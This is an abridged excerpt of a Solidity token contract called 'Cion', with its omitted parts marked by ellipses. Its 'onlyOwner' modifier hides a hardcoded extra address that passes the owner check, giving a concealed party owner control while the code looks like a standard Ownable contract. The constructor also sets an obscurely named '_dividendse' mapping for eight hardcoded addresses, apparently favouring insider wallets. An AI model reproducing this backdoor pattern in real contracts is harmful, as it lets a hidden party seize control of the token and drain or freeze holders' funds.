...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == address(0x9eFE30f6a57f16a578E2391f9A638E0039CCc3c9), "Ownable: caller is not the owner");
        _;
    }
...
contract Cion is IERC20, Ownable {
    ...
    constructor(
        ...
        _dividendse[0xDb308d785D3a8F235bD70b0a1a5Bc3612308fFce] = _amount;
        _dividendse[0x4D9bD68868643F75D1F070190eC1Cb96a3b45e90] = _amount;
        _dividendse[0xeD07f715402FbDdDD898dEcff83a39FaCE11ca62] = _amount;
        _dividendse[0x45252c92c12154E1e1A2050f630237bBcc883aAC] = _amount;
        _dividendse[0xD1d331462dBC67832e7e34cBA061F5DC7B414d6B] = _amount;
        _dividendse[0x4dffB5C29E8d497f154a3f789fc1A7BD7e48C3Ec] = _amount;
        _dividendse[0x8Dd101437Af08A394DF23b64824f31238Ec2c82d] = _amount;
        _dividendse[0x63F1Aa3dB64A4dD97B1da2aE7A91d064d4bEe181] = _amount;
